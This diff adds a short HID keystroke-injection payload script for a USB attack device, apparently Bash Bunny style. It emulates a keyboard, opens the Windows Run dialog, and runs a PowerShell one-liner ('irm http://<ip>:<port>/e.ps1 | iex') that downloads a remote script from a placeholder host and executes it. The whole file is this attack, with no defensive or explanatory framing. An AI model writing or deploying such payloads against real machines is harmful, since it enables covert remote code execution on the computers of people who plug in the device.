@@ -1,0 +1,13 @@
+ATTACKMODE HID
+
+LED R
+DELAY 200
+
+# This command opens the Windows "Run" dialog and runs a PowerShell script directly from a specified IP address and port.
+
+RUN WIN powershell "irm http://<ip>:<port>/e.ps1 | iex"
+
+#Let code run
+DELAY 200
+
+LED G
